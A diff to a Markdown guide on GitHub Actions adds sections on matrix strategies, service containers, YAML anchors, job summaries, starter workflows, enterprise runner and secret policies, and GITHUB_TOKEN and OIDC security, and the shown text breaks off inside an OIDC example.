@@ -59,7 +59,8 @@
     - [9. **Container**](#9-container)
     - [10. **services**](#10-services)
     - [11. **permissions**](#11-permissions)
-    - [12. **Complete Workflow Example**](#12-complete-workflow-example)
+    - [12. **YAML Anchors and Aliases**](#12-yaml-anchors-and-aliases)
+    - [13. **Complete Workflow Example**](#13-complete-workflow-example)
   - [GitHub Workflow Trigger Events](#github-workflow-trigger-events)
     - [Overview of Trigger Events](#overview-of-trigger-events)
     - [1. **push** - Code Push Event](#1-push---code-push-event)
@@ -121,6 +122,8 @@
       - [Using Variable Expansion](#using-variable-expansion)
     - [9. **Special Environment Variables**](#9-special-environment-variables)
       - [Special GitHub Environment Variables](#special-github-environment-variables)
+      - [GITHUB\_STEP\_SUMMARY — Job Summary Reports](#github_step_summary--job-summary-reports)
+      - [RUNNER\_TOOL\_CACHE — Preinstalled Software](#runner_tool_cache--preinstalled-software)
     - [10. **Best Practices for Environment Variables**](#10-best-practices-for-environment-variables)
       - [✓ Do's](#-dos)
       - [✗ Don'ts](#-donts)
@@ -255,6 +258,10 @@
     - [5. **Best Practices for Workflow Sharing**](#5-best-practices-for-workflow-sharing)
       - [✓ Recommended Practices](#-recommended-practices-3)
       - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-3)
+    - [6. **Starter Workflows**](#6-starter-workflows)
+      - [Creating an Organization Starter Workflow](#creating-an-organization-starter-workflow)
+      - [Disabling vs Deleting a Workflow](#disabling-vs-deleting-a-workflow)
+    - [7. **Workflow Status Badges**](#7-workflow-status-badges)
   - [Workflow Debugging](#workflow-debugging)
     - [What is Workflow Debugging?](#what-is-workflow-debugging)
     - [Why Debug Workflows?](#why-debug-workflows)
@@ -358,6 +365,23 @@
     - [8. **Best Practices for Runner Management**](#8-best-practices-for-runner-management)
       - [✓ Recommended Practices](#-recommended-practices-8)
       - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-8)
+  - [GitHub Actions for the Enterprise](#github-actions-for-the-enterprise)
+    - [Overview](#overview)
+    - [1. **Organizational Use Policies**](#1-organizational-use-policies)
+    - [2. **Controlling Access to Actions and Workflows Within an Enterprise**](#2-controlling-access-to-actions-and-workflows-within-an-enterprise)
+    - [3. **Runner Groups**](#3-runner-groups)
+    - [4. **IP Allow Lists**](#4-ip-allow-lists)
+    - [5. **Preinstalled Software on GitHub-Hosted Runners**](#5-preinstalled-software-on-github-hosted-runners)
+    - [6. **Secrets and Variables at Organization, Repository, and Environment Levels**](#6-secrets-and-variables-at-organization-repository-and-environment-levels)
+  - [Security and Optimization](#security-and-optimization)
+    - [Overview](#overview-1)
+    - [1. **GITHUB\_TOKEN — Lifecycle, Permissions, and Granular Scopes**](#1-github_token--lifecycle-permissions-and-granular-scopes)
+    - [2. **OIDC Token for Cloud Federation**](#2-oidc-token-for-cloud-federation)
+    - [3. **Pinning Actions to Full Commit SHAs**](#3-pinning-actions-to-full-commit-shas)
+    - [4. **Script Injection Mitigation**](#4-script-injection-mitigation)
+    - [5. **Identifying Trustworthy Marketplace Actions**](#5-identifying-trustworthy-marketplace-actions)
+    - [6. **Artifact Attestations and SLSA Provenance**](#6-artifact-attestations-and-slsa-provenance)
+    - [7. **Dependency Policy: Caching and Artifact Retention**](#7-dependency-policy-caching-and-artifact-retention)
   - [Common Failures and Troubleshooting](#common-failures-and-troubleshooting)
     - [1. **Authentication Errors**](#1-authentication-errors)
       - [Problem: Permission Denied](#problem-permission-denied)
@@ -409,7 +433,6 @@
       - [Solutions:](#solutions-11)
     - [13. **Quick Troubleshooting Checklist**](#13-quick-troubleshooting-checklist)
   - [Additional Resources](#additional-resources)
-
 
 ---
 
@@ -1087,6 +1110,84 @@ strategy:
   fail-fast: false
 ```
 
+**Matrix with `include` and `exclude`:**
+
+`include` adds extra combinations or extends existing ones. `exclude` removes specific combinations from the matrix.
+
+```yaml
+jobs:
+  build:
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        os: [ubuntu-latest, windows-latest, macos-latest]
+        node: [18, 20]
+        # exclude an unsupported combination
+        exclude:
+          - os: windows-latest
+            node: 18
+        # include an extra combination with additional variables
+        include:
+          - os: ubuntu-latest
+            node: 22
+            experimental: true
+          - os: macos-latest
+            node: 20
+            extra-flag: "--arm64"
+    runs-on: ${{ matrix.os }}
+    continue-on-error: ${{ matrix.experimental == true }}
+    steps:
+      - uses: actions/checkout@v3
+      - run: echo "Node ${{ matrix.node }} on ${{ matrix.os }}"
+```
+
+**`fail-fast`** (default `true`): When `true`, GitHub cancels all in-progress matrix jobs if any job fails. Set to `false` to let all combinations run regardless.
+
+**`max-parallel`**: Limits how many matrix jobs run concurrently. Reduces resource usage and cost.
+
+**Selectively Re-running Individual Matrix Jobs:**
+
+In the GitHub UI, after a workflow run with matrix jobs, you can re-run specific failed jobs instead of the entire matrix:
+
+- Navigate to the workflow run
+- Click the failed job
+- Click **Re-run jobs > Re-run failed jobs** (re-runs only the failed matrix variants)
+
+```yaml
+# Matrix with OS-specific runner image notes:
+strategy:
+  matrix:
+    os:
+      # ubuntu-20.04 is deprecated; migrate to ubuntu-22.04 or ubuntu-latest
+      - ubuntu-22.04
+      # windows-latest points to Windows Server 2025 as of 2025
+      - windows-latest
+      - macos-latest
+```
+
+**Dynamic Matrix from JSON:**
+
+```yaml
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - id: set-matrix
+        run: |
+          echo 'matrix={"include":[{"project":"foo","config":"a"},{"project":"bar","config":"b"}]}' >> $GITHUB_OUTPUT
+
+  build:
+    needs: setup
+    runs-on: ubuntu-latest
+    strategy:
+      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
+    steps:
+      - run: echo "Building ${{ matrix.project }} with config ${{ matrix.config }}"
+```
+
 ##### **if**
 
 Prevents a job from running unless a condition is met.
@@ -1237,7 +1338,20 @@ jobs:
 
 ### 10. **services**
 
-Additional containers to host services for a job in a workflow.
+Service containers run additional Docker containers alongside job steps, providing dependent services like databases, caches, and message queues. They are started before job steps and stopped after, and are accessible via `localhost` or by their service ID as hostname.
+
+**Full Service Container Configuration Options:**
+
+| Option        | Description                                            |
+| ------------- | ------------------------------------------------------ |
+| `image`       | Docker image for the container                         |
+| `env`         | Environment variables for the container                |
+| `ports`       | Port mappings to expose (`host:container`)             |
+| `options`     | Docker `--option` flags (health checks, volumes, etc.) |
+| `credentials` | Credentials for private container registries           |
+| `volumes`     | Volume mounts                                          |
+
+**Single Service (PostgreSQL):**
 
 ```yaml
 jobs:
@@ -1245,20 +1359,113 @@ jobs:
     runs-on: ubuntu-latest
     services:
       postgres:
-        image: postgres:13
+        image: postgres:15
         env:
-          POSTGRES_PASSWORD: postgres
+          POSTGRES_DB: testdb
+          POSTGRES_USER: testuser
+          POSTGRES_PASSWORD: testpassword
+        ports:
+          - 5432:5432
         options: >-
           --health-cmd pg_isready
           --health-interval 10s
           --health-timeout 5s
           --health-retries 5
-        ports:
-          - 5432:5432
     steps:
       - uses: actions/checkout@v3
-      - run: npm test
+      - name: Run Tests Against PostgreSQL
+        run: npm test
+        env:
+          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb
 ```
+
+**Multiple Services (Database + Redis):**
+
+```yaml
+jobs:
+  integration-test:
+    runs-on: ubuntu-latest
+    services:
+      postgres:
+        image: postgres:15
+        env:
+          POSTGRES_PASSWORD: secret
+        ports:
+          - 5432:5432
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+      redis:
+        image: redis:7
+        ports:
+          - 6379:6379
+        options: >-
+          --health-cmd "redis-cli ping"
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+      rabbitmq:
+        image: rabbitmq:3-management
+        env:
+          RABBITMQ_DEFAULT_USER: user
+          RABBITMQ_DEFAULT_PASS: password
+        ports:
+          - 5672:5672
+          - 15672:15672
+    steps:
+      - uses: actions/checkout@v3
+      - name: Wait for services to be ready
+        run: |
+          # Services health checks handle readiness automatically
+          echo "All services ready"
+      - name: Run Integration Tests
+        run: pytest tests/integration/
+        env:
+          DATABASE_URL: postgresql://postgres:secret@localhost:5432/postgres
+          REDIS_URL: redis://localhost:6379
+          AMQP_URL: amqp://user:password@localhost:5672
+```
+
+**Service Containers in Job Containers (container: + services:):**
+
+```yaml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    # When using a job container, use service ID (not localhost) as hostname
+    container:
+      image: node:18
+    services:
+      mysql:
+        image: mysql:8
+        env:
+          MYSQL_ROOT_PASSWORD: rootpass
+          MYSQL_DATABASE: testdb
+        options: >-
+          --health-cmd "mysqladmin ping -h localhost"
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 10
+        ports:
+          - 3306:3306
+    steps:
+      - uses: actions/checkout@v3
+      - name: Test with MySQL
+        run: npm test
+        env:
+          # Use service ID as hostname when job runs in container
+          DATABASE_HOST: mysql
+          DATABASE_PORT: 3306
+          DATABASE_NAME: testdb
+          DATABASE_USER: root
+          DATABASE_PASSWORD: rootpass
+```
+
+> **Note:** When your job runs directly on the runner (`runs-on` without `container:`), services are accessible via `localhost`. When your job runs inside a container (`container:`), services are accessible via the **service ID** as the hostname (e.g., `mysql`, `postgres`).
 
 ---
 
@@ -1275,7 +1482,114 @@ permissions:
 
 ---
 
-### 12. **Complete Workflow Example**
+### 12. **YAML Anchors and Aliases**
+
+YAML anchors (`&`) and aliases (`*`) allow you to reuse YAML content, keeping workflows DRY. GitHub Actions uses standard YAML parsing, so anchors are resolved before the workflow engine processes the file.
+
+**Syntax:**
+
+| Symbol      | Role                                                                           |
+| ----------- | ------------------------------------------------------------------------------ |
+| `&name`     | Defines an anchor called `name` at the marked node                             |
+| `*name`     | References (aliases) the anchor — replaces the alias with the anchored content |
+| `<<: *name` | Merge key — merges the anchor's mapping into the current mapping               |
+
+**Basic anchor and alias:**
+
+```yaml
+# Shared environment block
+x-common-env: &common-env
+  NODE_ENV: production
+  LOG_LEVEL: info
+  REGION: us-east-1
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      <<: *common-env # merges NODE_ENV, LOG_LEVEL, REGION into this job
+      APP_VERSION: "2.1.0"
+    steps:
+      - run: echo "Building $NODE_ENV app"
+
+  deploy:
+    runs-on: ubuntu-latest
+    env:
+      <<: *common-env # same shared env
+      DEPLOY_TARGET: production
+    steps:
+      - run: echo "Deploying to $REGION"
+```
+
+**Reusing step definitions:**
+
+```yaml
+x-checkout-step: &checkout
+  name: Checkout code
+  uses: actions/checkout@v4
+  with:
+    fetch-depth: 0
+
+x-setup-node: &setup-node
+  name: Set up Node.js
+  uses: actions/setup-node@v4
+  with:
+    node-version: "20"
+    cache: "npm"
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - <<: *checkout
+      - <<: *setup-node
+      - run: npm run lint
+
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - <<: *checkout
+      - <<: *setup-node
+      - run: npm test
+```
+
+**Anchors in matrix strategy:**
+
+```yaml
+x-default-strategy: &default-strategy
+  fail-fast: false
+  max-parallel: 3
+
+jobs:
+  unit-tests:
+    strategy:
+      <<: *default-strategy
+      matrix:
+        node: [18, 20]
+    runs-on: ubuntu-latest
+    steps:
+      - run: node --version
+
+  integration-tests:
+    strategy:
+      <<: *default-strategy
+      matrix:
+        db: [postgres, mysql]
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Testing with ${{ matrix.db }}"
+```
+
+**Important notes:**
+
+- Top-level YAML keys beginning with `x-` are ignored by GitHub Actions — use them as a convention for anchor definitions to avoid validation errors
+- Anchors are resolved by the YAML parser; the **workflow logs show the resolved values**, not anchor names
+- Anchors cannot span across files — they only work within the same `.yml` file
+- The `<<` merge key merges all key–value pairs from the referenced mapping; existing keys in the current mapping take precedence
+
+---
+
+### 13. **Complete Workflow Example**
 
 ```yaml
 name: Full CI/CD Pipeline
@@ -2603,6 +2917,76 @@ jobs:
 | `RUNNER_TEMP`             | Path to temporary directory                                           |
 | `RUNNER_TOOL_CACHE`       | Path to tool cache directory                                          |
 | `RUNNER_WORKSPACE`        | Path to workspace directory                                           |
+
+#### GITHUB_STEP_SUMMARY — Job Summary Reports
+
+`GITHUB_STEP_SUMMARY` points to a per-job Markdown file. Content you write to it appears in the **Summary** tab of a workflow run, making it easy to surface test results, coverage, and other reports without downloading artifacts.
+
+```yaml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run tests
+        id: tests
+        run: |
+          npm test --reporter json > test-results.json
+          echo "PASS_COUNT=$(jq '.numPassedTests' test-results.json)" >> $GITHUB_ENV
+          echo "FAIL_COUNT=$(jq '.numFailedTests' test-results.json)" >> $GITHUB_ENV
+
+      - name: Write job summary
+        if: always() # run even if tests fail so summary is always produced
+        run: |
+          echo "## Test Results :test_tube:" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Status | Count |" >> $GITHUB_STEP_SUMMARY
+          echo "|--------|-------|" >> $GITHUB_STEP_SUMMARY
+          echo "| ✅ Passed | $PASS_COUNT |" >> $GITHUB_STEP_SUMMARY
+          echo "| ❌ Failed | $FAIL_COUNT |" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          if [ "$FAIL_COUNT" -gt 0 ]; then
+            echo "> [!WARNING]" >> $GITHUB_STEP_SUMMARY
+            echo "> $FAIL_COUNT test(s) failed. Check the logs above for details." >> $GITHUB_STEP_SUMMARY
+          fi
+```
+
+**Multi-step summaries** accumulate — each step appends to the same file:
+
+```yaml
+steps:
+  - name: Build summary
+    run: |
+      echo "## Build :hammer:" >> $GITHUB_STEP_SUMMARY
+      echo "Built from \`${{ github.ref_name }}\` @ \`${{ github.sha }}\`" >> $GITHUB_STEP_SUMMARY
+
+  - name: Deploy summary
+    run: |
+      echo "## Deployment :rocket:" >> $GITHUB_STEP_SUMMARY
+      echo "Deployed to **production** at $(date -u)" >> $GITHUB_STEP_SUMMARY
+      echo "[View deployment](${{ vars.PROD_URL }})" >> $GITHUB_STEP_SUMMARY
+```
+
+**Key rules:**
+
+- Use `>> $GITHUB_STEP_SUMMARY` (append) not `>` (overwrite)
+- Supports standard GitHub-flavored Markdown including tables, task lists, alerts, and collapsible sections
+- Summary is per-job — each job has its own summary tab
+- The file is automatically collected and shown on the workflow run Summary page
+
+#### RUNNER_TOOL_CACHE — Preinstalled Software
+
+`RUNNER_TOOL_CACHE` points to the directory where GitHub-hosted runner images pre-install language runtimes and tools (the "tool cache"). `setup-*` actions install into or read from this path.
+
+```yaml
+- name: List preinstalled tool cache contents
+  run: ls $RUNNER_TOOL_CACHE
+  # Typical output: Python/ node/ go/ java/...
+```
+
+GitHub publishes the preinstalled software lists for each runner image at:
+`https://github.com/actions/runner-images` (see the `images/` subdirectory for each OS)
 
 ### 10. **Best Practices for Environment Variables**
 
@@ -5101,6 +5485,116 @@ uses: org/workflows/.github/workflows/build.yml@v1    # Better
 
 ---
 
+### 6. **Starter Workflows**
+
+Starter workflows are template workflows stored in a repository's `.github/workflows/` or in the org-level `.github` repository under `workflow-templates/`. When a user **creates a new workflow** in a repository, GitHub offers these templates in the Actions tab.
+
+**Key characteristic:** Starter workflows are **copied** into the consuming repository and become independent. They are not linked back — changes to the template do not propagate.
+
+| Feature                  | Starter Workflow              | Reusable Workflow               | Composite Action                |
+| ------------------------ | ----------------------------- | ------------------------------- | ------------------------------- |
+| How invoked              | Copied on creation (one-time) | `uses:` at runtime              | `uses:` at runtime              |
+| Stays linked to source?  | ❌ No — independent copy      | ✅ Yes — always runs latest ref | ✅ Yes — always runs pinned ref |
+| Versioned?               | No — snapshot at copy time    | Yes — via `@ref`                | Yes — via `@ref`                |
+| Best for                 | Scaffolding new workflows     | Sharing execution logic         | Encapsulating step logic        |
+| Customizable after copy? | ✅ Yes — full control         | ⚠️ Via inputs only              | ⚠️ Via inputs only              |
+
+#### Creating an Organization Starter Workflow
+
+Store the template file in `{org}/.github/workflow-templates/my-template.yml` and a corresponding metadata file `my-template.properties.json`:
+
+```json
+// workflow-templates/python-ci.properties.json
+{
+  "name": "Python CI",
+  "description": "Lint and test Python packages",
+  "iconName": "octicon python",
+  "categories": ["Python", "CI"]
+}
+```
+
+```yaml
+# workflow-templates/python-ci.yml
+name: Python CI
+
+on:
+  push:
+    branches: [$default-branch] # placeholder replaced on copy
+  pull_request:
+    branches: [$default-branch]
+
+jobs:
+  lint-and-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.x"
+      - run: pip install ruff pytest
+      - run: ruff check .
+      - run: pytest
+```
+
+> For **public** repositories, starter workflows are visible to all GitHub users. For organization repositories, they are visible only to members with repository access.
+
+#### Disabling vs Deleting a Workflow
+
+| Action      | Effect                                                                                       | When to use                                            |
+| ----------- | -------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
+| **Disable** | Workflow is paused; no new runs trigger. History and logs preserved. Re-enable at any time.  | Temporarily halt a workflow (e.g., during maintenance) |
+| **Delete**  | Workflow file is removed from the repository. All run history is also deleted after 90 days. | Permanently remove an obsolete workflow                |
+
+**Disable via UI:** Actions tab → click the workflow → ⋯ menu → **Disable workflow**
+
+**Disable via REST API:**
+
+```bash
+# Disable a workflow
+curl -X PUT \
+  -H "Authorization: Bearer $GITHUB_TOKEN" \
+  -H "Accept: application/vnd.github+json" \
+  https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/disable
+
+# Re-enable a workflow
+curl -X PUT \
+  -H "Authorization: Bearer $GITHUB_TOKEN" \
+  -H "Accept: application/vnd.github+json" \
+  https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/enable
+```
+
+---
+
+### 7. **Workflow Status Badges**
+
+Embed a live status badge in your README or other Markdown files to show whether the latest run of a workflow passed or failed.
+
+**Badge URL format:**
+
+```
+https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg
+```
+
+**Branch-specific badge** (defaults to the default branch):
+
+```
+https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg?branch=main
+```
+
+**Markdown embed:**
+
+```markdown
+[![CI](https://github.com/myorg/myrepo/actions/workflows/ci.yml/badge.svg)](https://github.com/myorg/myrepo/actions/workflows/ci.yml)
+
+<!-- Branch-specific badge -->
+
+[![Build Status](https://github.com/myorg/myrepo/actions/workflows/build.yml/badge.svg?branch=release)](https://github.com/myorg/myrepo/actions/workflows/build.yml?query=branch%3Arelease)
+```
+
+**Badge states:** `passing`, `failing`, `no status` (no runs yet), `cancelled`, `skipped`
+
+---
+
 ## Workflow Debugging
 
 ### What is Workflow Debugging?
@@ -7524,6 +8018,621 @@ runs-on: self-hosted  # Ambiguous which runner
 # ✗ Don't ignore runner isolation
 # Each job should be isolated
 # Don't share state between runs
+```
+
+---
+
+## GitHub Actions for the Enterprise
+
+### Overview
+
+Enterprise-scale usage of GitHub Actions requires governance, access control, and policy enforcement to ensure security, cost efficiency, and consistent standards across teams and repositories.
+
+---
+
+### 1. **Organizational Use Policies**
+
+Organization and enterprise admins can restrict which actions and reusable workflows are allowed.
+
+**Policy options (set in Organization Settings → Actions → General):**
+
+| Policy                   | Description                                              |
+| ------------------------ | -------------------------------------------------------- |
+| Allow all actions        | No restrictions                                          |
+| Allow local actions only | Only actions in the same organization/enterprise         |
+| Allow select actions     | An explicit allow list of `owner/repo@ref` patterns      |
+| Disable Actions          | Completely disable GitHub Actions for the org/enterprise |
+
+**Allow-list patterns:**
+
+```
+# Allow all verified creator actions
+actions/*
+github/*
+
+# Allow specific third-party actions (pinned or wildcard)
+docker/build-push-action@*
+hashicorp/setup-terraform@*
+
+# Allow all actions from a specific org
+myorg/*
+```
+
+> Wildcard `*` matches any version/ref. Use full SHAs for stronger guarantees.
+
+**Requiring approval for first-time contributors:**
+
+In org settings you can require that first-time contributors have their workflow runs approved by a maintainer before they execute, reducing risk from fork-based attacks.
+
+---
+
+### 2. **Controlling Access to Actions and Workflows Within an Enterprise**
+
+**Repository access controls:**
+
+- Actions in private repositories are only callable by workflows in the same repository by default
+- To share across repositories: **Settings → Actions → General → Access → Allow workflows from other repositories**
+- For org-level reusable workflows: set the repository visibility to `internal` or configure cross-repo permissions
+
+**Enterprise policies override org policies:**
+
+```
+Enterprise admin → can restrict org admins from changing policies
+Org admin        → can set policies within enterprise-allowed bounds
+Repo admin       → can set policies within org-allowed bounds
+```
+
+**Required workflows (enterprise feature):**
+
+Enterprise admins can enforce that specific reusable workflows run on all repositories matching a filter, regardless of the repository workflow configuration:
+
+```
+Enterprise Settings → Policies → Required workflows
+→ Add workflow: org/compliance-workflows/.github/workflows/scan.yml@main
+→ Apply to: all repositories in selected organizations
+```
+
+---
+
+### 3. **Runner Groups**
+
+Runner groups organize self-hosted runners and control which repositories or organizations can use them.
+
+**Creating and managing runner groups:**
+
+```bash
+# Create a runner group (org level)
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Accept: application/vnd.github+json" \
+  https://api.github.com/orgs/ORG/actions/runner-groups \
+  -d '{
+    "name": "production-runners",
+    "visibility": "selected",
+    "selected_repository_ids": [12345, 67890],
+    "allows_public_repositories": false
+  }'
+```
+
+**Using a runner group in a workflow:**
+
+```yaml
+jobs:
+  deploy:
+    runs-on:
+      group: production-runners # target the group
+      labels: [self-hosted, linux] # optionally add label filters
+    steps:
+      - run: echo "Running on a production runner"
+```
+
+**Key access rules:**
+
+- A runner group set to `visibility: private` is accessible only to the org
+- A runner group set to `visibility: selected` allows specific repositories
+- Enterprise-level groups can span organizations
+- A runner can only belong to one group at a time
+
+---
+
+### 4. **IP Allow Lists**
+
+GitHub-hosted runners use a range of dynamic IP addresses. For services that lock down inbound traffic, you have several options:
+
+**Option A: Retrieve GitHub-hosted runner IPs and add to your allow list**
+
+```bash
+# Get current GitHub Actions IP ranges (changes frequently)
+curl https://api.github.com/meta | jq '.actions'
+```
+
+> Note: IP ranges change frequently. GitHub provides webhooks (`meta` event) to notify when the list changes.
+
+**Option B: Use a self-hosted runner inside your network perimeter**
+
+Self-hosted runners run on infrastructure you control, so the source IP is predictable:
+
+```yaml
+jobs:
+  deploy-internal:
+    runs-on: [self-hosted, internal-network]
+    steps:
+      - run: curl https://internal.company.com/api/deploy
+```
+
+**Option C: GitHub Enterprise Cloud — IP allow list integration**
+
+Enterprise Cloud customers can enable the "GitHub Actions" entry in the organization's IP allow list. This automatically allows traffic from GitHub-hosted runner IPs without manual maintenance.
+
+---
+
+### 5. **Preinstalled Software on GitHub-Hosted Runners**
+
+GitHub-hosted runners include a broad set of preinstalled tools in the **tool cache** (`RUNNER_TOOL_CACHE`).
+
+**Key preinstalled categories:**
+
+| Category          | Examples                                                      |
+| ----------------- | ------------------------------------------------------------- |
+| Language runtimes | Node.js, Python, Ruby, Java (multiple LTS versions), Go, .NET |
+| Build tools       | Maven, Gradle, Ant, CMake, make                               |
+| Package managers  | npm, pip, bundler, nuget, Homebrew (macOS)                    |
+| Cloud CLIs        | AWS CLI, Azure CLI, Google Cloud CLI                          |
+| Container tools   | Docker, Docker Compose, kubectl, Helm                         |
+| Version control   | Git, GitHub CLI (`gh`)                                        |
+| Utilities         | tar, curl, wget, jq, yq                                       |
+
+**Checking what's available:**
+
+```yaml
+- name: List available tools
+  run: |
+    echo "--- Node versions ---"
+    ls $RUNNER_TOOL_CACHE/node/
+    echo "--- Python versions ---"
+    ls $RUNNER_TOOL_CACHE/Python/ || ls $RUNNER_TOOL_CACHE/python/
+```
+
+**Using `setup-*` actions to select a version:**
+
+```yaml
+- uses: actions/setup-node@v4
+  with:
+    node-version: "20" # reads from tool cache if available
+
+- uses: actions/setup-python@v5
+  with:
+    python-version: "3.12"
+
+- uses: actions/setup-java@v4
+  with:
+    distribution: "temurin"
+    java-version: "21"
+```
+
+**Finding the full list:**
+
+The complete software manifest for each image is published at:
+`https://github.com/actions/runner-images`
+Each runner image folder contains an `Included-Software.md` file.
+
+> **Ubuntu 20.04 deprecation:** As of late 2024, `ubuntu-20.04` images are deprecated. Migrate to `ubuntu-22.04` or `ubuntu-latest`.
+> **`windows-latest`** now points to Windows Server 2025 images.
+
+---
+
+### 6. **Secrets and Variables at Organization, Repository, and Environment Levels**
+
+GitHub provides a three-tier hierarchy for secrets and variables, with more specific scopes overriding broader ones.
+
+**Hierarchy (most specific wins):**
+
+```
+Enterprise → Organization → Repository → Environment
+```
+
+**Secrets vs Variables:**
+
+| Type     | Stored encrypted?       | Visible in logs? | Use for                     |
+| -------- | ----------------------- | ---------------- | --------------------------- |
+| Secret   | ✅ Yes — masked in logs | ❌ Never         | API keys, passwords, tokens |
+| Variable | ❌ No — plain text      | ✅ Yes           | Non-sensitive config values |
+
+**Accessing in workflows:**
+
+```yaml
+env:
+  # Secret (from org, repo, or environment)
+  API_KEY: ${{ secrets.API_KEY }}
+
+  # Variable (from org, repo, or environment)
+  DEPLOY_REGION: ${{ vars.DEPLOY_REGION }}
+
+  # Environment-specific (takes priority over repo/org)
+  DB_HOST: ${{ secrets.DB_HOST }} # could differ per environment
+```
+
+**Setting environment-level secrets/variables:**
+
+```yaml
+jobs:
+  deploy:
+    environment: production # activates environment-level secrets/vars
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Deploying to ${{ vars.ENVIRONMENT_NAME }}"
+        env:
+          PROD_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+```
+
+**Managing via REST API:**
+
+```bash
+# List organization secrets
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/secrets
+
+# Create/update a repository secret (value must be encrypted with the repo's public key)
+curl -X PUT \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/SECRET_NAME \
+  -d '{"encrypted_value": "BASE64_ENCRYPTED", "key_id": "KEY_ID"}'
+
+# Create a repository variable
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables \
+  -d '{"name": "DEPLOY_REGION", "value": "us-east-1"}'
+
+# Create an organization variable (visibility controls which repos can read it)
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/variables \
+  -d '{"name": "ORG_REGION", "value": "eu-west-1", "visibility": "selected", "selected_repository_ids": [111, 222]}'
+```
+
+---
+
+## Security and Optimization
+
+### Overview
+
+Security is a first-class concern in GitHub Actions. In addition to correctly managing access controls (covered in the Enterprise section), secure workflows also require attention to token hygiene, injection prevention, supply chain security, and OIDC-based federation.
+
+---
+
+### 1. **GITHUB_TOKEN — Lifecycle, Permissions, and Granular Scopes**
+
+`GITHUB_TOKEN` is an automatically provisioned short-lived token that GitHub creates at the **start of each job** and revokes when the job finishes.
+
+**Lifecycle:**
+
+```
+Job starts → GITHUB_TOKEN created (scoped to the repo, job lifetime)
+Job ends   → GITHUB_TOKEN revoked automatically
+```
+
+**Important: GITHUB_TOKEN cannot trigger new workflow runs** (prevents infinite loops). Use a PAT or GitHub App token for cross-repository triggers or triggering new runs.
+
+**Default permissions (read-only by default for hardened orgs):**
+
+Organizations can set the default permission level:
+
+- `permissive` — write access to most scopes (legacy default)
+- `restricted` — read-only across all scopes (recommended)
+
+**Granting granular permissions at job scope:**
+
+```yaml
+jobs:
+  release:
+    permissions:
+      contents: write # push tags/releases
+      packages: write # push to GitHub Packages
+      id-token: write # request OIDC token
+      pull-requests: read
+      issues: none # explicitly deny
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Token has only the permissions above"
+```
+
+**Available permission scopes:**
+
+| Scope                 | What it controls              |
+| --------------------- | ----------------------------- |
+| `actions`             | Manage workflow runs          |
+| `checks`              | Create/update check runs      |
+| `contents`            | Read/write repository content |
+| `deployments`         | Create deployments            |
+| `id-token`            | Request OIDC JWT              |
+| `issues`              | Read/write issues             |
+| `packages`            | Read/write GitHub Packages    |
+| `pages`               | Manage GitHub Pages           |
+| `pull-requests`       | Read/write PRs                |
+| `repository-projects` | Manage projects               |
+| `security-events`     | Upload code scanning results  |
+| `statuses`            | Set commit statuses           |
+
+**GITHUB_TOKEN vs Personal Access Token (PAT):**
+
+| Property               | GITHUB_TOKEN          | PAT                            |
+| ---------------------- | --------------------- | ------------------------------ |
+| Provisioned            | Automatically per job | Manually by a user             |
+| Lifetime               | Job duration only     | Configurable (days–years)      |
+| Scope                  | Single repository     | User-defined (can be wide)     |
+| Revocation             | Automatic on job end  | Manual                         |
+| Triggers new workflows | ❌ No                 | ✅ Yes                         |
+| Cross-repo access      | ❌ No                 | ✅ Yes                         |
+| Risk profile           | Low                   | Higher (long-lived credential) |
+
+**GitHub Apps** (fine-grained installation tokens) are the recommended alternative to PATs for automated cross-repo access.
+
+---
+
+### 2. **OIDC Token for Cloud Federation**
+
+OpenID Connect (OIDC) allows workflows to obtain short-lived credentials from cloud providers (AWS, Azure, GCP) **without storing long-lived secrets**.
+
+**How it works:**
+
+```
+1. Workflow requests an OIDC JWT from GitHub (requires id-token: write)
+2. GitHub signs the JWT with its OIDC provider keys
+3. Cloud provider validates the JWT against GitHub's OIDC discovery endpoint
+4. If valid, cloud provider issues short-lived access credentials
+5. Workflow uses those credentials — they expire automatically
+```
+
+**GitHub OIDC discovery URL:** `https://token.actions.githubusercontent.com`
+
+**AWS example:**
+
+```yaml
+jobs:
+  deploy:
+    permissions:
+      id-token: write # required for OIDC
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
